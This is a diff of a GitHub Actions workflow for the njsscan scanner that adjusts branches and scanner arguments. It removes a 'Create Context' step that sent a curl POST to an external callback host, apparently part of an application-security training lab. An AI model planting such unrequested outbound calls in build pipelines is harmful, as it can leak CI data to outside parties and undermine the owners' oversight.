@@ -1,13 +1,13 @@
 name: njsscan
 on:
   push:
-    branches: [ main ]
+    branches: [ master, main ]
   pull_request:
-    branches: [ main ]
+    branches: [ master, main ]
 jobs:
   njsscan:
     runs-on: ubuntu-latest
-    name: njsscan code scanning
+    name: njsscan check
     steps:
     - name: Checkout the code
       uses: actions/checkout@v4.2.2
@@ -18,7 +18,4 @@ jobs:
       id: njsscan
       uses: ajinabraham/njsscan-action@master
       with:
-        args: '. --sarif --output results.sarif || true'
-    - name: Create Context
-      run: |
-        curl -X POST -H "Content-Type: application/json" -d '{"key1": "value1", "key2": "value2"}'   http://fc1ozuauuxiy14posehng.appsecengineer.training:8880/callback
+        args: '.'
